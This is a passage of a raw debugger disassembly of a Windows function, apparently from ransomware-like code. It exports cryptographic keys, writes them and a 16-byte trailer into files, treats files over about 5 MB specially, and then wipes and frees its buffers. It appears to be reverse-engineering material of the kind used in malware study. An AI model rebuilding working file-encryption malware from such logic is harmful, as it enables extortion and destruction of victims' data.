0000000140004081 | 74 24                    | je 1400040A7                            |
0000000140004083 | 4C:8D55 A0               | lea r10,qword ptr ss:[rbp-60]           |
0000000140004087 | 66:0F1F8400 00000000     | nop word ptr ds:[rax+rax],ax            |
0000000140004090 | 41:0FB602                | movzx eax,byte ptr ds:[r10]             |
0000000140004094 | 41:8D0C11                | lea ecx,qword ptr ds:[r9+rdx]           |
0000000140004098 | FFC2                     | inc edx                                 |
000000014000409A | 88440D 88                | mov byte ptr ss:[rbp+rcx-78],al         |
000000014000409E | 4D:8D52 01               | lea r10,qword ptr ds:[r10+1]            |
00000001400040A2 | 41:3BD0                  | cmp edx,r8d                             |
00000001400040A5 | 72 E9                    | jb 140004090                            |
00000001400040A7 | 41:8D0411                | lea eax,qword ptr ds:[r9+rdx]           |
00000001400040AB | B9 01000000              | mov ecx,1                               |
00000001400040B0 | 40:887C05 88             | mov byte ptr ss:[rbp+rax-78],dil        |
00000001400040B5 | 40:387D 89               | cmp byte ptr ss:[rbp-77],dil            |
00000001400040B9 | 74 15                    | je 1400040D0                            |
00000001400040BB | 48:8D45 89               | lea rax,qword ptr ss:[rbp-77]           |
00000001400040BF | 90                       | nop                                     |
00000001400040C0 | FFC1                     | inc ecx                                 |
00000001400040C2 | 48:8D40 01               | lea rax,qword ptr ds:[rax+1]            |
00000001400040C6 | 40:3838                  | cmp byte ptr ds:[rax],dil               |
00000001400040C9 | 75 F5                    | jne 1400040C0                           |
00000001400040CB | 0F1F4400 00              | nop dword ptr ds:[rax+rax],eax          |
00000001400040D0 | 8BC1                     | mov eax,ecx                             |
00000001400040D2 | 41:B9 01000000           | mov r9d,1                               |
00000001400040D8 | C64405 88 7C             | mov byte ptr ss:[rbp+rax-78],7C         | 7C:'|'
00000001400040DD | 8D41 01                  | lea eax,qword ptr ds:[rcx+1]            |
00000001400040E0 | 40:887C05 88             | mov byte ptr ss:[rbp+rax-78],dil        |
00000001400040E5 | 40:387D 89               | cmp byte ptr ss:[rbp-77],dil            |
00000001400040E9 | 74 11                    | je 1400040FC                            |
00000001400040EB | 48:8D45 89               | lea rax,qword ptr ss:[rbp-77]           |
00000001400040EF | 90                       | nop                                     |
00000001400040F0 | 41:FFC1                  | inc r9d                                 |
00000001400040F3 | 48:8D40 01               | lea rax,qword ptr ds:[rax+1]            |
00000001400040F7 | 40:3838                  | cmp byte ptr ds:[rax],dil               |
00000001400040FA | 75 F4                    | jne 1400040F0                           |
00000001400040FC | 41:B8 01000000           | mov r8d,1                               |
0000000140004102 | 48:8D45 81               | lea rax,qword ptr ss:[rbp-7F]           |
0000000140004106 | 6666:0F1F8400 00000000   | nop word ptr ds:[rax+rax],ax            |
0000000140004110 | 41:FFC0                  | inc r8d                                 |
0000000140004113 | 48:8D40 01               | lea rax,qword ptr ds:[rax+1]            |
0000000140004117 | 40:3838                  | cmp byte ptr ds:[rax],dil               |
000000014000411A | 75 F4                    | jne 140004110                           |
000000014000411C | 8BD7                     | mov edx,edi                             |
000000014000411E | 45:85C0                  | test r8d,r8d                            |
0000000140004121 | 74 24                    | je 140004147                            |
0000000140004123 | 4C:8D55 80               | lea r10,qword ptr ss:[rbp-80]           |
0000000140004127 | 66:0F1F8400 00000000     | nop word ptr ds:[rax+rax],ax            |
0000000140004130 | 41:0FB602                | movzx eax,byte ptr ds:[r10]             |
0000000140004134 | 41:8D0C11                | lea ecx,qword ptr ds:[r9+rdx]           |
0000000140004138 | FFC2                     | inc edx                                 |
000000014000413A | 88440D 88                | mov byte ptr ss:[rbp+rcx-78],al         |
000000014000413E | 4D:8D52 01               | lea r10,qword ptr ds:[r10+1]            |
0000000140004142 | 41:3BD0                  | cmp edx,r8d                             |
0000000140004145 | 72 E9                    | jb 140004130                            |
0000000140004147 | 41:8D0411                | lea eax,qword ptr ds:[r9+rdx]           |
000000014000414B | 40:887C05 88             | mov byte ptr ss:[rbp+rax-78],dil        |
0000000140004150 | EB 2D                    | jmp 14000417F                           |
0000000140004152 | B9 01000000              | mov ecx,1                               |
0000000140004157 | 48:8D45 81               | lea rax,qword ptr ss:[rbp-7F]           |
000000014000415B | 0F1F4400 00              | nop dword ptr ds:[rax+rax],eax          |
0000000140004160 | FFC1                     | inc ecx                                 |
0000000140004162 | 48:8D40 01               | lea rax,qword ptr ds:[rax+1]            |
0000000140004166 | 40:3838                  | cmp byte ptr ds:[rax],dil               |
0000000140004169 | 75 F5                    | jne 140004160                           |
000000014000416B | 85C9                     | test ecx,ecx                            |
000000014000416D | 74 10                    | je 14000417F                            |
000000014000416F | 44:8BC1                  | mov r8d,ecx                             |
0000000140004172 | 48:8D55 80               | lea rdx,qword ptr ss:[rbp-80]           |
0000000140004176 | 48:8D4D 88               | lea rcx,qword ptr ss:[rbp-78]           |
000000014000417A | E8 C11A0100              | call 140015C40                          |
000000014000417F | 41:B8 01000000           | mov r8d,1                               |
0000000140004185 | 897C24 54                | mov dword ptr ss:[rsp+54],edi           |
0000000140004189 | 40:387D 89               | cmp byte ptr ss:[rbp-77],dil            |
000000014000418D | 74 10                    | je 14000419F                            |
000000014000418F | 48:8D45 89               | lea rax,qword ptr ss:[rbp-77]           |
0000000140004193 | 41:FFC0                  | inc r8d                                 |
0000000140004196 | 48:8D40 01               | lea rax,qword ptr ds:[rax+1]            |
000000014000419A | 40:3838                  | cmp byte ptr ds:[rax],dil               |
000000014000419D | 75 F4                    | jne 140004193                           |
000000014000419F | 4C:8D4C24 54             | lea r9,qword ptr ss:[rsp+54]            |
00000001400041A4 | 48:897C24 20             | mov qword ptr ss:[rsp+20],rdi           |
00000001400041A9 | 48:8D55 88               | lea rdx,qword ptr ss:[rbp-78]           |
00000001400041AD | 48:8BCB                  | mov rcx,rbx                             |
00000001400041B0 | FF15 D23D3800            | call qword ptr ds:[<&WriteFile>]        |
00000001400041B6 | 85C0                     | test eax,eax                            |
00000001400041B8 | 75 2F                    | jne 1400041E9                           |
00000001400041BA | 33D2                     | xor edx,edx                             | SIZE_T dwSize
00000001400041BC | 41:B8 00800000           | mov r8d,8000                            | DWORD dwFreeType = MEM_RELEASE
00000001400041C2 | 48:8BCE                  | mov rcx,rsi                             | LPVOID lpAddress = "C:\\users\\Public\\PUBLIC"
00000001400041C5 | FF15 5D8C0200            | call qword ptr ds:[<&VirtualFree>]      | VirtualFree
00000001400041CB | 48:8BCB                  | mov rcx,rbx                             | HANDLE hObject
00000001400041CE | FF15 4C8C0200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
00000001400041D4 | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
00000001400041D9 | FF15 29433800            | call qword ptr ds:[<&CryptDestroyKey>]  | CryptDestroyKey
00000001400041DF | B8 12000000              | mov eax,12                              |
00000001400041E4 | E9 31020000              | jmp 14000441A                           |
00000001400041E9 | 4C:8B7424 78             | mov r14,qword ptr ss:[rsp+78]           |
00000001400041EE | 48:8D4424 60             | lea rax,qword ptr ss:[rsp+60]           |
00000001400041F3 | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
00000001400041F8 | 45:33C9                  | xor r9d,r9d                             | DWORD dwFlags
00000001400041FB | 48:894424 28             | mov qword ptr ss:[rsp+28],rax           | DWORD* pdwDataLen
0000000140004200 | 49:8BD6                  | mov rdx,r14                             | HCRYPTKEY hExpKey
0000000140004203 | 48:897C24 20             | mov qword ptr ss:[rsp+20],rdi           | BYTE* pbData
0000000140004208 | 45:8D41 01               | lea r8d,qword ptr ds:[r9+1]             | DWORD dwBlobType
000000014000420C | FF15 DE8E0200            | call qword ptr ds:[<&CryptExportKey>]   | CryptExportKey
0000000140004212 | 85C0                     | test eax,eax                            |
0000000140004214 | 75 2F                    | jne 140004245                           |
0000000140004216 | 33D2                     | xor edx,edx                             | SIZE_T dwSize
0000000140004218 | 41:B8 00800000           | mov r8d,8000                            | DWORD dwFreeType = MEM_RELEASE
000000014000421E | 48:8BCE                  | mov rcx,rsi                             | LPVOID lpAddress = "C:\\users\\Public\\PUBLIC"
0000000140004221 | FF15 018C0200            | call qword ptr ds:[<&VirtualFree>]      | VirtualFree
0000000140004227 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hObject
000000014000422A | FF15 F08B0200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
0000000140004230 | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
0000000140004235 | FF15 CD423800            | call qword ptr ds:[<&CryptDestroyKey>]  | CryptDestroyKey
000000014000423B | B8 13000000              | mov eax,13                              |
0000000140004240 | E9 D5010000              | jmp 14000441A                           |
0000000140004245 | 48:8D45 E0               | lea rax,qword ptr ss:[rbp-20]           |
0000000140004249 | B9 04000000              | mov ecx,4                               |
000000014000424E | 66:90                    | nop                                     |
0000000140004250 | 48:8938                  | mov qword ptr ds:[rax],rdi              |
0000000140004253 | 48:8978 08               | mov qword ptr ds:[rax+8],rdi            |
0000000140004257 | 48:8978 10               | mov qword ptr ds:[rax+10],rdi           |
000000014000425B | 48:8D40 40               | lea rax,qword ptr ds:[rax+40]           | rax+40:L"lic\\PUBLIC"
000000014000425F | 48:8978 D8               | mov qword ptr ds:[rax-28],rdi           |
0000000140004263 | 48:8978 E0               | mov qword ptr ds:[rax-20],rdi           |
0000000140004267 | 48:8978 E8               | mov qword ptr ds:[rax-18],rdi           |
000000014000426B | 48:8978 F0               | mov qword ptr ds:[rax-10],rdi           |
000000014000426F | 48:8978 F8               | mov qword ptr ds:[rax-8],rdi            |
0000000140004273 | 48:83E9 01               | sub rcx,1                               |
0000000140004277 | 75 D7                    | jne 140004250                           |
0000000140004279 | 48:8938                  | mov qword ptr ds:[rax],rdi              |
000000014000427C | 44:8D41 01               | lea r8d,qword ptr ds:[rcx+1]            | DWORD dwBlobType
0000000140004280 | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
0000000140004285 | 45:33C9                  | xor r9d,r9d                             | DWORD dwFlags
0000000140004288 | 48:8978 08               | mov qword ptr ds:[rax+8],rdi            |
000000014000428C | 49:8BD6                  | mov rdx,r14                             | HCRYPTKEY hExpKey
000000014000428F | 48:8978 10               | mov qword ptr ds:[rax+10],rdi           |
0000000140004293 | 48:8978 18               | mov qword ptr ds:[rax+18],rdi           |
0000000140004297 | 48:8978 20               | mov qword ptr ds:[rax+20],rdi           |
000000014000429B | 8978 28                  | mov dword ptr ds:[rax+28],edi           | rax+28:L"C:\\users\\Public\\PUBLIC"
000000014000429E | 48:8D4424 60             | lea rax,qword ptr ss:[rsp+60]           |
00000001400042A3 | 48:894424 28             | mov qword ptr ss:[rsp+28],rax           | DWORD* pdwDataLen
00000001400042A8 | 48:8D45 E0               | lea rax,qword ptr ss:[rbp-20]           |
00000001400042AC | 48:894424 20             | mov qword ptr ss:[rsp+20],rax           | BYTE* pbData
00000001400042B1 | FF15 398E0200            | call qword ptr ds:[<&CryptExportKey>]   | CryptExportKey
00000001400042B7 | 85C0                     | test eax,eax                            |
00000001400042B9 | 75 2F                    | jne 1400042EA                           |
00000001400042BB | 33D2                     | xor edx,edx                             | SIZE_T dwSize
00000001400042BD | 41:B8 00800000           | mov r8d,8000                            | DWORD dwFreeType = MEM_RELEASE
00000001400042C3 | 48:8BCE                  | mov rcx,rsi                             | LPVOID lpAddress = "C:\\users\\Public\\PUBLIC"
00000001400042C6 | FF15 5C8B0200            | call qword ptr ds:[<&VirtualFree>]      | VirtualFree
00000001400042CC | 48:8BCB                  | mov rcx,rbx                             | HANDLE hObject
00000001400042CF | FF15 4B8B0200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
00000001400042D5 | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
00000001400042DA | FF15 28423800            | call qword ptr ds:[<&CryptDestroyKey>]  | CryptDestroyKey
00000001400042E0 | B8 14000000              | mov eax,14                              |
00000001400042E5 | E9 30010000              | jmp 14000441A                           |
00000001400042EA | 44:8B4424 60             | mov r8d,dword ptr ss:[rsp+60]           | DWORD nNumberOfBytesToWrite
00000001400042EF | 4C:8D4C24 54             | lea r9,qword ptr ss:[rsp+54]            | LPDWORD lpNumberOfBytesWritten
00000001400042F4 | 48:8D55 E0               | lea rdx,qword ptr ss:[rbp-20]           | LPCVOID lpBuffer
00000001400042F8 | 897C24 54                | mov dword ptr ss:[rsp+54],edi           |
00000001400042FC | 48:8BCB                  | mov rcx,rbx                             | HANDLE hFile
00000001400042FF | 48:897C24 20             | mov qword ptr ss:[rsp+20],rdi           | LPOVERLAPPED lpOverlapped
0000000140004304 | FF15 7E3C3800            | call qword ptr ds:[<&WriteFile>]        | WriteFile
000000014000430A | 85C0                     | test eax,eax                            |
000000014000430C | 75 2F                    | jne 14000433D                           |
000000014000430E | 33D2                     | xor edx,edx                             | SIZE_T dwSize
0000000140004310 | 41:B8 00800000           | mov r8d,8000                            | DWORD dwFreeType = MEM_RELEASE
0000000140004316 | 48:8BCE                  | mov rcx,rsi                             | LPVOID lpAddress = "C:\\users\\Public\\PUBLIC"
0000000140004319 | FF15 098B0200            | call qword ptr ds:[<&VirtualFree>]      | VirtualFree
000000014000431F | 48:8BCB                  | mov rcx,rbx                             | HANDLE hObject
0000000140004322 | FF15 F88A0200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
0000000140004328 | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
000000014000432D | FF15 D5413800            | call qword ptr ds:[<&CryptDestroyKey>]  | CryptDestroyKey
0000000140004333 | B8 15000000              | mov eax,15                              |
0000000140004338 | E9 DD000000              | jmp 14000441A                           |
000000014000433D | 48:817C24 70 404B4C00    | cmp qword ptr ss:[rsp+70],4C4B40        |
0000000140004346 | 0F86 98000000            | jbe 1400043E4                           |
000000014000434C | 41:B9 02000000           | mov r9d,2                               | DWORD dwMoveMethod = FILE_END
0000000140004352 | 45:33C0                  | xor r8d,r8d                             | PLARGE_INTEGER lpNewFilePointer
0000000140004355 | 48:8BD7                  | mov rdx,rdi                             | LARGE_INTEGER liDistanceToMove
0000000140004358 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hFile
000000014000435B | FF15 978D0200            | call qword ptr ds:[<&SetFilePointerEx>] | SetFilePointerEx
0000000140004361 | 41:3BC7                  | cmp eax,r15d                            |
0000000140004364 | 75 2F                    | jne 140004395                           |
0000000140004366 | 33D2                     | xor edx,edx                             | SIZE_T dwSize
0000000140004368 | 41:B8 00800000           | mov r8d,8000                            | DWORD dwFreeType = MEM_RELEASE
000000014000436E | 48:8BCE                  | mov rcx,rsi                             | LPVOID lpAddress = "C:\\users\\Public\\PUBLIC"
0000000140004371 | FF15 B18A0200            | call qword ptr ds:[<&VirtualFree>]      | VirtualFree
0000000140004377 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hObject
000000014000437A | FF15 A08A0200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
0000000140004380 | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
0000000140004385 | FF15 7D413800            | call qword ptr ds:[<&CryptDestroyKey>]  | CryptDestroyKey
000000014000438B | B8 16000000              | mov eax,16                              |
0000000140004390 | E9 85000000              | jmp 14000441A                           |
0000000140004395 | 4C:8D4D 80               | lea r9,qword ptr ss:[rbp-80]            | LPDWORD lpNumberOfBytesWritten
0000000140004399 | 897D 80                  | mov dword ptr ss:[rbp-80],edi           |
000000014000439C | 41:B8 10000000           | mov r8d,10                              | DWORD nNumberOfBytesToWrite = 10
00000001400043A2 | 48:897C24 20             | mov qword ptr ss:[rsp+20],rdi           | LPOVERLAPPED lpOverlapped
00000001400043A7 | 48:8D55 B0               | lea rdx,qword ptr ss:[rbp-50]           | LPCVOID lpBuffer
00000001400043AB | 48:8BCB                  | mov rcx,rbx                             | HANDLE hFile
00000001400043AE | FF15 D43B3800            | call qword ptr ds:[<&WriteFile>]        | WriteFile
00000001400043B4 | 85C0                     | test eax,eax                            |
00000001400043B6 | 75 2C                    | jne 1400043E4                           |
00000001400043B8 | 33D2                     | xor edx,edx                             | SIZE_T dwSize
00000001400043BA | 41:B8 00800000           | mov r8d,8000                            | DWORD dwFreeType = MEM_RELEASE
00000001400043C0 | 48:8BCE                  | mov rcx,rsi                             | LPVOID lpAddress = "C:\\users\\Public\\PUBLIC"
00000001400043C3 | FF15 5F8A0200            | call qword ptr ds:[<&VirtualFree>]      | VirtualFree
00000001400043C9 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hObject
00000001400043CC | FF15 4E8A0200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
00000001400043D2 | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
00000001400043D7 | FF15 2B413800            | call qword ptr ds:[<&CryptDestroyKey>]  | CryptDestroyKey
00000001400043DD | B8 17000000              | mov eax,17                              |
00000001400043E2 | EB 36                    | jmp 14000441A                           |
00000001400043E4 | 48:8BCB                  | mov rcx,rbx                             | HANDLE hObject
00000001400043E7 | FF15 338A0200            | call qword ptr ds:[<&CloseHandle>]      | CloseHandle
00000001400043ED | 33C0                     | xor eax,eax                             |
00000001400043EF | B9 9A420F00              | mov ecx,F429A                           |
00000001400043F4 | 48:8BFE                  | mov rdi,rsi                             | rsi:L"C:\\users\\Public\\PUBLIC"
00000001400043F7 | 33D2                     | xor edx,edx                             | SIZE_T dwSize
00000001400043F9 | F3:AA                    | rep stosb                               |
00000001400043FB | 48:8BCE                  | mov rcx,rsi                             | LPVOID lpAddress = "C:\\users\\Public\\PUBLIC"
00000001400043FE | 41:B8 00800000           | mov r8d,8000                            | DWORD dwFreeType = MEM_RELEASE
0000000140004404 | FF15 1E8A0200            | call qword ptr ds:[<&VirtualFree>]      | VirtualFree
000000014000440A | 48:8B4C24 40             | mov rcx,qword ptr ss:[rsp+40]           | HCRYPTKEY hKey
000000014000440F | FF15 F3403800            | call qword ptr ds:[<&CryptDestroyKey>]  | CryptDestroyKey
0000000140004415 | B8 37000000              | mov eax,37                              | 37:'7'
000000014000441A | 4C:8BA424 78020000       | mov r12,qword ptr ss:[rsp+278]          |
0000000140004422 | 4C:8BBC24 20020000       | mov r15,qword ptr ss:[rsp+220]          |
000000014000442A | 4C:8BAC24 28020000       | mov r13,qword ptr ss:[rsp+228]          |
0000000140004432 | 48:8B8D 10010000         | mov rcx,qword ptr ss:[rbp+110]          |
0000000140004439 | 48:33CC                  | xor rcx,rsp                             |
000000014000443C | E8 CF2F0000              | call 140007410                          |
0000000140004441 | 48:81C4 30020000         | add rsp,230                             |
0000000140004448 | 41:5E                    | pop r14                                 |
000000014000444A | 5F                       | pop rdi                                 |
000000014000444B | 5E                       | pop rsi                                 | rsi:L"C:\\users\\Public\\PUBLIC"
000000014000444C | 5B                       | pop rbx                                 |
000000014000444D | 5D                       | pop rbp                                 |
000000014000444E | C3                       | ret                                     |